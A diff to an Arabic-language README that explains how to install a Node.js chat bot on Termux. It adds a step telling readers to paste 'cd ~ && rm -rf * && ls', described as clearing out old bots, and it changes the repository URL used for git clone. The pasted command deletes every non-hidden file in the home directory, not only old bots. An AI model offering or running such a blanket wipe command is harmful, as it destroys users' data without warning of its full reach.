@@ -11,12 +11,18 @@
 
 ## طريقة التثبيت على Termux:
 
-1. افتح تطبيق Termux وانسخ الأوامر التالية بالترتيب:
+1. **أمر التصفية الشامل (حذف كل الملفات القديمة)**:
+انسخ هذا الأمر لتنظيف Termux تماماً من أي بوتات قديمة:
+```bash
+cd ~ && rm -rf * && ls
+```
 
+2. **تثبيت النسخة الفتاكة V10.3**:
+انسخ هذه الأوامر بالترتيب لبدء السيطرة على نظافة:
 ```bash
 pkg update && pkg upgrade -y
 pkg install nodejs git -y
-git clone https://github.com/Manus-Dev/seifer-bot.git
+git clone https://github.com/seiferfanerfan-jpg/seifer-bot.git
 cd seifer-bot
 npm install
 node index.js
